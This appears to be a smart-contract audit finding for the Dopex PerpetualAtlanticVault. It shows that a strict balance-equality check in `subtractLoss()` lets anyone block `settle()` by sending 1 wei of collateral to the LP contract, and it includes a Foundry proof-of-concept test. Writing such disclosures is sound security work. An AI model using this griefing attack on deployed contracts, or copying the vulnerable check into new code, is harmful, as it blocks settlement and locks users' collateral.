## Description

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L315-L369
```solidity
function settle(
  uint256[] memory optionIds
)
  external
  nonReentrant
  onlyRole(RDPXV2CORE_ROLE)
  returns (uint256 ethAmount, uint256 rdpxAmount)
{
  _whenNotPaused();
  _isEligibleSender();

  updateFunding();

  for (uint256 i = 0; i < optionIds.length; i++) {
    uint256 strike = optionPositions[optionIds[i]].strike;
    uint256 amount = optionPositions[optionIds[i]].amount;

    // [...]
    // Burn option tokens from user
    _burn(optionIds[i]);

    optionPositions[optionIds[i]].strike = 0;
  }

  // Transfer collateral token from perpetual vault to rdpx rdpxV2Core
  collateralToken.safeTransferFrom(
    addresses.perpetualAtlanticVaultLP,
    addresses.rdpxV2Core,
    ethAmount
  );
  // Transfer rdpx from rdpx rdpxV2Core to perpetual vault
  IERC20WithBurn(addresses.rdpx).safeTransferFrom(
    addresses.rdpxV2Core,
    addresses.perpetualAtlanticVaultLP,
    rdpxAmount
  );
   IPerpetualAtlanticVaultLP(addresses.perpetualAtlanticVaultLP).subtractLoss(
    ethAmount
  );
  // [...]

  emit Settle(ethAmount, rdpxAmount, optionIds);
}
```

`settle()` is used by contract with `RDPXV2CORE_ROLE` role to settle the users options by passing `optionIds`. 

Once all the option ids are burned, it transfers collateral tokens from perpetual vault to RDPX rdpxV2Core contract and then it transfers RDPX from rdpxV2Core contract to perpetual vault.

At the end it checks if invariants defined in `subtractLoss(), addRdpx()` holds true.

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L359-L361
```solidity
IPerpetualAtlanticVaultLP(addresses.perpetualAtlanticVaultLP).subtractLoss(
    ethAmount
  );
```

https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L199-L205
```solidity
function subtractLoss(uint256 loss) public onlyPerpVault {
  require(
    collateral.balanceOf(address(this)) == _totalCollateral - loss,
    "Not enough collateral was sent out"
  );
  _totalCollateral -= loss;
}
```

There is a strict check in `subtractLoss()` as shown below which can be break by bad actor by just transferring 1 wei of collateral tokens to `PerpetualAtlanticVaultLP` contract.
## Impact

Bad actor could DoS `settle()` by transferring 1 wei of collateral token to PerpetualAtlanticVaultLP contract. Because of this, no user's open option position can be settled. Due to this, user is losing their collateral.
## Proof of Concept

Add following test in `Unit.t.sol` file and run it using 
`forge test --mp tests/perp-vault/Unit.t.sol --mt testSettleDoS -vvvv`

```solidity
function testSettleDoS() public {
    weth.mint(address(1), 1 ether);
    deposit(1 ether, address(1));

    vault.purchase(1 ether, address(this));

    priceOracle.updateRdpxPrice(0.010 gwei); // ITM
    uint256[] memory ids = new uint256[](1);
    ids[0] = 0;
    // If called settle(ids) here, it will be successfully executed
    // Transfer 1 wei of collateral token to PerpetualAtlanticVaultLP contract
    address bad_actor = makeAddr("bad actor");
    deal(address(weth), bad_actor, 1);
    vm.prank(bad_actor, bad_actor);
    weth.transfer(address(vaultLp), 1);

    vm.expectRevert(
      "Not enough collateral was sent out"
    );
    vault.settle(ids);
}
```
